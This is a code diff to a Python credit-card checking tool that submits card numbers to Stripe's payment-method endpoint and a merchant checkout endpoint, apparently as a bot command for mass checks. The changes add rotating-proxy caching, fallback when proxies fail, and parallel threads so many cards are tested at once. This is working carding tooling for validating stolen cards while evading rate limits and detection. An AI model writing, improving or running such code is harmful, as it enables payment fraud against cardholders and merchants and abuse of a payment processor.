@@ -9,6 +9,8 @@ import string
 from urllib.parse import urlparse
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
 
 # Developer info
 dev = "@mhitzxg"
@@ -87,18 +89,29 @@ def requests_retry_session(
     session.mount('https://', adapter)
     return session
 
-def get_random_proxy():
-    """Get a random proxy from proxy.txt file"""
+# Thread-safe proxy management
+proxy_lock = Lock()
+proxy_list_cache = []
+
+def load_proxies():
+    """Load proxies from file into cache"""
+    global proxy_list_cache
     try:
         with open('proxy.txt', 'r') as f:
-            proxies = f.readlines()
-            if not proxies:
-                return None
-            
-            proxy_str = random.choice(proxies).strip()
-            return parse_proxy(proxy_str)
+            proxy_list_cache = [line.strip() for line in f.readlines() if line.strip()]
     except:
-        return None
+        proxy_list_cache = []
+
+def get_random_proxy():
+    """Get a random proxy from proxy.txt file - Thread-safe"""
+    global proxy_list_cache
+    with proxy_lock:
+        if not proxy_list_cache:
+            load_proxies()
+        if not proxy_list_cache:
+            return None
+        proxy_str = random.choice(proxy_list_cache)
+        return parse_proxy(proxy_str)
 
 def get_bin_info(bin_number):
     """Get BIN information using multiple APIs"""
@@ -230,7 +243,7 @@ def extract_error_from_response(response_text):
                     else:
                         return str(error_msg)
                 
-                if 'data' in data and isinstance(data['data'], dict and 'error' in data['data']):
+                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']:
                     error_data = data['data']['error']
                     if isinstance(error_data, dict) and 'message' in error_data:
                         return str(error_data['message'])
@@ -401,26 +414,24 @@ def test_charge(cc_line):
         # Get proxy
         proxy_dict = get_random_proxy()
         
-        # Make Stripe API request with retry logic
+        # Make Stripe API request with retry logic and proxy error handling
         max_retries = 3
+        use_proxy = True if proxy_dict else False
+        
         for retry_count in range(max_retries):
             try:
                 # Create session with retry logic
                 session = requests_retry_session(retries=2, backoff_factor=0.5)
                 
-                if proxy_dict:
-                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
-                                                  headers=headers_stripe, 
-                                                  data=data_stripe,
-                                                  proxies=proxy_dict,
-                                                  timeout=30,
-                                                  verify=False)
-                else:
-                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
-                                                  headers=headers_stripe, 
-                                                  data=data_stripe,
-                                                  timeout=30,
-                                                  verify=False)
+                # Use proxy only if available and not disabled due to previous errors
+                current_proxy = proxy_dict if use_proxy else None
+                
+                response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
+                                              headers=headers_stripe, 
+                                              data=data_stripe,
+                                              proxies=current_proxy,
+                                              timeout=30,
+                                              verify=False)
                 break  # Success, break out of retry loop
                 
             except (requests.exceptions.SSLError, 
@@ -428,13 +439,24 @@ def test_charge(cc_line):
                     requests.exceptions.Timeout,
                     requests.exceptions.RequestException) as e:
                 
+                error_msg = str(e)
+                
+                # Check for proxy connection pool errors (442, 502, etc.)
+                proxy_error_codes = ['442', '502', '503', '504', 'connection pool', 'pool', 'proxy', 'CONNECTION ERROR']
+                is_proxy_error = any(code in error_msg.upper() for code in proxy_error_codes)
+                
+                # If proxy error and we still have retries, retry without proxy
+                if is_proxy_error and use_proxy and retry_count < max_retries - 1:
+                    use_proxy = False  # Disable proxy for next retry
+                    time.sleep(1)  # Brief delay before retry
+                    continue
+                
                 if retry_count < max_retries - 1:
                     time.sleep(2 ** retry_count)  # Exponential backoff
                     continue
                 else:
                     # All retries failed
                     elapsed_time = time.time() - start_time
-                    error_msg = str(e)
                     
                     # Handle specific SSL error
                     if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
@@ -645,33 +667,28 @@ def test_charge(cc_line):
 
         time.sleep(random.uniform(1, 2))
         
-        # Make final AJAX request with retry logic
+        # Make final AJAX request with retry logic and proxy error handling
+        ajax_use_proxy = use_proxy  # Use same proxy state as Stripe request
+        ajax_proxy_dict = proxy_dict if ajax_use_proxy else None
+        
         for retry_count in range(max_retries):
             try:
                 # Create session with retry logic for AJAX request
                 ajax_session = requests_retry_session(retries=2, backoff_factor=0.5)
                 
-                if proxy_dict:
-                    response_ajax = ajax_session.post(
-                        aj,
-                        params=params_ajax,
-                        cookies=cookies_ajax,
-                        headers=headers_ajax,
-                        data=data_ajax,
-                        proxies=proxy_dict,
-                        timeout=30,
-                        verify=False
-                    )
-                else:
-                    response_ajax = ajax_session.post(
-                        aj,
-                        params=params_ajax,
-                        cookies=cookies_ajax,
-                        headers=headers_ajax,
-                        data=data_ajax,
-                        timeout=30,
-                        verify=False
-                    )
+                # Use proxy only if available and not disabled due to previous errors
+                current_ajax_proxy = ajax_proxy_dict if ajax_use_proxy else None
+                
+                response_ajax = ajax_session.post(
+                    aj,
+                    params=params_ajax,
+                    cookies=cookies_ajax,
+                    headers=headers_ajax,
+                    data=data_ajax,
+                    proxies=current_ajax_proxy,
+                    timeout=30,
+                    verify=False
+                )
                 break  # Success, break out of retry loop
                 
             except (requests.exceptions.SSLError, 
@@ -679,12 +696,23 @@ def test_charge(cc_line):
                     requests.exceptions.Timeout,
                     requests.exceptions.RequestException) as e:
                 
+                error_msg = str(e)
+                
+                # Check for proxy connection pool errors (442, 502, etc.)
+                proxy_error_codes = ['442', '502', '503', '504', 'connection pool', 'pool', 'proxy', 'CONNECTION ERROR']
+                is_proxy_error = any(code in error_msg.upper() for code in proxy_error_codes)
+                
+                # If proxy error and we still have retries, retry without proxy
+                if is_proxy_error and ajax_use_proxy and retry_count < max_retries - 1:
+                    ajax_use_proxy = False  # Disable proxy for next retry
+                    time.sleep(1)  # Brief delay before retry
+                    continue
+                
                 if retry_count < max_retries - 1:
                     time.sleep(2 ** retry_count)  # Exponential backoff
                     continue
                 else:
                     # All retries failed
-                    error_msg = str(e)
                     if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                         error_msg = "SSL Connection Error - Proxy/Network Issue"
                     
@@ -857,17 +885,34 @@ def test_charge(cc_line):
 def check_single_cc(cc_line):
     return test_charge(cc_line)
 
-# Mass CC check function for /mst command  
-def check_mass_cc(cc_lines):
-    """Process multiple CCs - EXACTLY LIKE YOUR OLD FILE"""
+# Mass CC check function for /mst command with parallel processing
+def check_mass_cc(cc_lines, max_workers=10):
+    """Process multiple CCs in parallel with threading"""
     results = []
-    for cc_line in cc_lines:
+    
+    # Initialize proxy cache
+    load_proxies()
+    
+    def process_card(cc_line):
+        """Wrapper function to process a single card"""
         try:
             result = test_charge(cc_line.strip())
-            results.append(result)
-            # Add delay between requests
-            time.sleep(random.uniform(1, 2))
+            return result
         except Exception as e:
-            results.append(f"❌ Error processing card: {str(e)}")
+            return f"❌ Error processing card: {str(e)}"
+    
+    # Use ThreadPoolExecutor for parallel processing
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all tasks
+        future_to_cc = {executor.submit(process_card, cc_line): cc_line for cc_line in cc_lines}
+        
+        # Collect results as they complete
+        for future in as_completed(future_to_cc):
+            try:
+                result = future.result()
+                results.append(result)
+            except Exception as e:
+                cc_line = future_to_cc[future]
+                results.append(f"❌ Error processing card {cc_line}: {str(e)}")
     
     return results
